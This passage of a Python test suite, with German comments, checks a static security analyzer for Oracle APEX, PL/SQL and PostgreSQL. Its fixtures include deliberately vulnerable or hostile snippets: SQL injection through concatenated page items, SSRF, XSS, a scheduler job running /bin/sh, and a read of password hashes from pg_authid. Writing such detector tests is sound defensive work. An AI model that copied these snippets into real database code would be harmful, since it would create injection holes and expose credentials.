                    "ACI-APEX-DYNSQL-SESSION-STATE")


def test_apex_ssrf_rest_with_item_is_flagged(mitre_base):
    code = ("BEGIN\n  l := APEX_WEB_SERVICE.MAKE_REST_REQUEST(p_url => "
            "'http://x/' || :P1_TARGET, p_http_method => 'GET');\nEND;\n")
    assert _has(mitre_findings(code, mitre_base), "ACI-APEX-SSRF-REST")


def test_apex_rest_fixed_url_is_not_flagged(mitre_base):
    code = ("BEGIN\n  l := APEX_WEB_SERVICE.MAKE_REST_REQUEST(p_url => "
            "'https://fixed/api');\nEND;\n")
    assert not _has(mitre_findings(code, mitre_base), "ACI-APEX-SSRF-REST")


def test_apex_xss_htp_with_item_is_flagged(mitre_base):
    code = "BEGIN\n  HTP.P('<div>' || :P1_COMMENT || '</div>');\nEND;\n"
    assert _has(mitre_findings(code, mitre_base), "ACI-APEX-XSS-HTP")


def test_apex_htp_literal_only_is_not_flagged(mitre_base):
    code = "BEGIN\n  HTP.P('<tr>' || '<td>x</td>');\nEND;\n"
    assert not _has(mitre_findings(code, mitre_base), "ACI-APEX-XSS-HTP")


def test_ords_autorest_enable_is_flagged(mitre_base):
    code = "BEGIN ORDS.ENABLE_OBJECT(p_object => 'APP_USERS'); END;\n"
    assert _has(mitre_findings(code, mitre_base), "ACI-ORDS-AUTOREST-ENABLE")


def test_apex_weak_authz_is_disabled_by_default(mitre_base):
    # ACI-APEX-WEAK-AUTHZ ist enabled:false -> darf standardmaessig nicht feuern.
    code = ("BEGIN\n  IF V('APP_USER') = 'ADMIN' THEN NULL; END IF;\nEND;\n")
    assert not _has(mitre_findings(code, mitre_base), "ACI-APEX-WEAK-AUTHZ")


def test_apex_mail_with_item_is_flagged(mitre_base):
    code = ("BEGIN\n  APEX_MAIL.SEND(p_to => :P1_TO || '@x.com', "
            "p_subj => 's', p_body => 'b');\nEND;\n")
    assert _has(mitre_findings(code, mitre_base), "ACI-APEX-MAIL-EXFIL")


# -- APEX-bewusste SQL-Injection-Kennzeichnung (Kern-Check) --------------

def test_apex_item_in_execute_immediate_is_labeled(oracle_rules):
    code = ("CREATE OR REPLACE PROCEDURE p IS\nBEGIN\n"
            "  EXECUTE IMMEDIATE 'select * from emp where ename = ''' "
            "|| :P1_NAME || '''';\nEND;\n/\n")
    f = sqli(code, oracle_rules)
    assert any(x.severity == Severity.CRITICAL and "APEX" in x.message
               for x in f)


def test_apex_v_function_in_open_for_is_labeled(oracle_rules):
    code = ("CREATE OR REPLACE PROCEDURE p IS\n  c SYS_REFCURSOR;\nBEGIN\n"
            "  OPEN c FOR 'select * from t where id = ' || V('P1_ID');\n"
            "END;\n/\n")
    f = sqli(code, oracle_rules)
    assert any("APEX" in x.message for x in f)


def test_routine_parameter_not_labeled_as_apex(oracle_rules):
    # Regression: ein normaler Routine-Parameter bleibt 1st-order, NICHT apex.
    code = ("CREATE OR REPLACE PROCEDURE p(p_obj IN VARCHAR2) IS\nBEGIN\n"
            "  EXECUTE IMMEDIATE 'drop table ' || p_obj;\nEND;\n/\n")
    f = sqli(code, oracle_rules)
    msgs = " ".join(x.message for x in f)
    assert "1st-order" in msgs and "APEX" not in msgs


# -- APEX-Export (Phase 3): Code in wwv_flow_api-String-Argumenten -------

def test_apex_export_function_body_concat_is_flagged(mitre_base):
    # 'PL/SQL Function Body returning SQL' als Export-Argument (Code im String,
    # mit ''-Escapes).
    code = ("begin\nwwv_flow_imp_page.create_page_plug(\n"
            " p_plug_source=>'return ''select * from emp where deptno = ''"
            "||:P1_DEPT;',\n p_plug_source_type=>'NATIVE_PLSQL');\nend;\n/\n")
    assert _has(mitre_findings(code, mitre_base), "ACI-APEX-EXPORT-DYNSQL")


def test_apex_export_bind_source_is_not_flagged(mitre_base):
    # Region-Source mit Bind (kein ||) -> sicher.
    code = ("begin\nwwv_flow_imp_page.create_page_plug(\n"
            " p_plug_source=>'select ename from emp where deptno = :P1_DEPT',\n"
            " p_plug_source_type=>'NATIVE_SQL_REPORT');\nend;\n/\n")
    assert not _has(mitre_findings(code, mitre_base), "ACI-APEX-EXPORT-DYNSQL")


def test_apex_export_non_code_arg_is_not_flagged(mitre_base):
    # Ein Nicht-Code-Argument (p_plug_name) mit || und Item -> kein Treffer,
    # da kein code-tragendes Argument.
    code = ("begin\nwwv_flow_imp_page.create_page_plug(\n"
            " p_plug_name=>'select '||:P1_X||' from t');\nend;\n/\n")
    assert not _has(mitre_findings(code, mitre_base), "ACI-APEX-EXPORT-DYNSQL")


# -- ACI 2.17.0: EPAS Oracle-kompatible Pakete ---------------------------

def test_epas_utl_file_in_plpgsql_body_is_flagged(mitre_base):
    # UTL_FILE-Aufruf in einem dollar-quoted PL/pgSQL-Body wird erkannt
    # (Body-Inhalt wird nicht als String maskiert).
    code = ("CREATE FUNCTION f() RETURNS void AS $$\n"
            "BEGIN\n  PERFORM UTL_FILE.FOPEN('D','f.txt','r');\nEND;\n"
            "$$ LANGUAGE plpgsql;\n")
    assert _has(_pg_mitre(code, mitre_base), "ACI-EPAS-UTL-FILE")


def test_epas_utl_file_in_string_is_not_flagged(mitre_base):
    # Reine String-Erwaehnung -> kein Treffer (maskiert).
    assert not _has(_pg_mitre("SELECT 'UTL_FILE.FOPEN';\n", mitre_base),
                    "ACI-EPAS-UTL-FILE")


def test_epas_utl_http_is_flagged(mitre_base):
    f = _pg_mitre("BEGIN v := UTL_HTTP.REQUEST('http://x'); END;\n", mitre_base)
    assert _has(f, "ACI-EPAS-UTL-HTTP")


def test_epas_scheduler_executable_is_critical(mitre_base):
    code = ("BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'j',"
            "job_type=>'EXECUTABLE',job_action=>'/bin/sh'); END;\n")
    f = _pg_mitre(code, mitre_base)
    hit = [x for x in f if x.check_id == "ACI-EPAS-SCHEDULER-EXECUTABLE"]
    assert hit and hit[0].severity is Severity.CRITICAL


def test_epas_scheduler_plsql_block_is_not_executable(mitre_base):
    code = ("BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'j',"
            "job_type=>'PLSQL_BLOCK',job_action=>'BEGIN NULL; END;'); END;\n")
    assert not _has(_pg_mitre(code, mitre_base),
                    "ACI-EPAS-SCHEDULER-EXECUTABLE")


def test_epas_dbms_sql_parse_is_flagged(mitre_base):
    assert _has(_pg_mitre("BEGIN DBMS_SQL.PARSE(c, v, 1); END;\n", mitre_base),
                "ACI-EPAS-DBMS-SQL")


# -- ACI 2.17.0: PG-native Regeln ----------------------------------------

def test_pg_session_replication_role_is_flagged(mitre_base):
    assert _has(_pg_mitre("SET session_replication_role = replica;\n",
                          mitre_base), "ACI-PG-SESSION-REPLICATION-ROLE")


def test_pg_normal_set_is_not_session_replication_role(mitre_base):
    assert not _has(_pg_mitre("SET work_mem = '64MB';\n", mitre_base),
                    "ACI-PG-SESSION-REPLICATION-ROLE")


def test_pg_row_security_off_is_flagged(mitre_base):
    assert _has(_pg_mitre("SET row_security = off;\n", mitre_base),
                "ACI-PG-SET-ROW-SECURITY-OFF")


def test_pg_row_security_on_is_not_flagged(mitre_base):
    assert not _has(_pg_mitre("SET row_security = on;\n", mitre_base),
                    "ACI-PG-SET-ROW-SECURITY-OFF")


def test_pg_reassign_owned_is_flagged(mitre_base):
    assert _has(_pg_mitre("REASSIGN OWNED BY a TO b;\n", mitre_base),
                "ACI-PG-REASSIGN-OWNED")


def test_pg_read_pg_authid_is_flagged(mitre_base):
    assert _has(_pg_mitre("SELECT rolpassword FROM pg_authid;\n", mitre_base),
                "ACI-PG-READ-PG-AUTHID")


def test_pg_read_pg_authid_in_string_is_not_flagged(mitre_base):
    assert not _has(_pg_mitre("SELECT 'from pg_authid';\n", mitre_base),
                    "ACI-PG-READ-PG-AUTHID")
